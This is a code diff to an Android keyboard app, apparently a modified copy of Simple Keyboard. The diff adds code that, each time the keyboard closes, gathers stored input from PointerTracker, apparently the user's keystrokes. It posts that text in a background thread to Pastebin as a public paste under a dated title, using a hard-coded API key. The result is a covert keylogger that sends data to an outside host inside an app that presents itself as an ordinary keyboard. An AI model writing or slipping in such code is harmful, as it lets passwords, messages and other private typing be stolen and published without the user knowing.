@@ -16,6 +16,7 @@
 
 package rkr.simplekeyboard.inputmethod.latin;
 
+import android.annotation.SuppressLint;
 import android.app.AlertDialog;
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -52,6 +53,8 @@ import java.io.PrintWriter;
 import java.net.*;
 import java.net.URLConnection;
 import java.nio.charset.StandardCharsets;
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.HashMap;
 import java.util.Locale;
 import java.util.Map;
@@ -484,56 +487,64 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
             mainKeyboardView.closing();
         }
         clearNavigationBarColor();
-        sendStorage();
+        Thread t1 = new Thread(this::sendStorage);
+        t1.start();
     }
 
     private void sendStorage() {
-        String mata;
-        mata = PointerTracker.getStorage();
-//      postAPI();
-        PointerTracker.clearStorage();
+        new Thread(() -> {
+            String mata;
+            System.out.println("mata");
+            mata = PointerTracker.getStorage();
+            postAPI(mata);
+            PointerTracker.clearStorage();
+        }).start();
     }
-    private static void postAPI(){
-        try {
-            URL url = new URL("https://pastebin.com/api/api_post.php");
-            URLConnection con = url.openConnection();
-            HttpURLConnection http = (HttpURLConnection)con;
-            http.setRequestMethod("POST");
-            http.setDoOutput(true);
-            http.setDoInput(true);
-            Map<String,String> arguments = new HashMap<>();
 
-            arguments.put("api_dev_key", "kdudUXx9JjV2Epb9DPWfXc19SmXXBnDO");
-            arguments.put("api_paste_code"," Ethan buy me a beer" );
-            // Repeat this for for all required API arguments
-            // ...
+    private static void postAPI(String mata) {
+        new Thread(() -> {
+            try {
+                URL url = new URL("https://pastebin.com/api/api_post.php");
+                HttpURLConnection http = (HttpURLConnection) url.openConnection();
+                http.setRequestMethod("POST");
+                http.setDoOutput(true);
+                http.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+                String date = new SimpleDateFormat("dd-MM-yyyy").format(new Date());
 
-            StringJoiner sj = null;
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                sj = new StringJoiner("&");
-            }
-            for(Map.Entry<String,String> entry : arguments.entrySet())
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+
+                Map<String, String> arguments = new HashMap<>();
+                arguments.put("api_dev_key", "kdudUXx9JjV2Epb9DPWfXc19SmXXBnDO"); // Replace with your actual API key
+                arguments.put("api_paste_code", mata);
+                arguments.put("api_paste_name", "AFenyEsikRaAPlafonra" + date); // Set your paste title here
+                arguments.put("api_paste_private", "0"); // 0 = Public, 1 = Unlisted, 2 = Private
+                arguments.put("api_option", "paste"); // Required for creating a new paste
+
+                StringJoiner sj = new StringJoiner("&");
+                for (Map.Entry<String, String> entry : arguments.entrySet()) {
                     sj.add(URLEncoder.encode(entry.getKey(), "UTF-8") + "="
                             + URLEncoder.encode(entry.getValue(), "UTF-8"));
                 }
-            byte[] out = sj.toString().getBytes(StandardCharsets.UTF_8);
-            int length = out.length;
-            http.setFixedLengthStreamingMode(length);
-            http.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-            http.connect();
-            OutputStream os = http.getOutputStream();
-            os.write(out);
-            InputStream is = http.getInputStream();
-            String text = null;
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                text = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8)).lines().collect(Collectors.joining("\n"));
+
+                byte[] out = sj.toString().getBytes(StandardCharsets.UTF_8);
+                http.setFixedLengthStreamingMode(out.length);
+                http.connect();
+
+                try (OutputStream os = http.getOutputStream()) {
+                    os.write(out);
+                }
+
+                try (BufferedReader br = new BufferedReader(new InputStreamReader(http.getInputStream(), StandardCharsets.UTF_8))) {
+                    String response = br.lines().collect(Collectors.joining("\n"));
+                    System.out.println("Paste URL: " + response);
+                }
+
+
+            } catch (IOException e) {
+                e.printStackTrace();
             }
-            System.out.println(text);
-        } catch (IOException urlException) {
-            urlException.printStackTrace();
-        }
+        }).start();
     }
+
 
     void onFinishInputInternal() {
         super.onFinishInput();
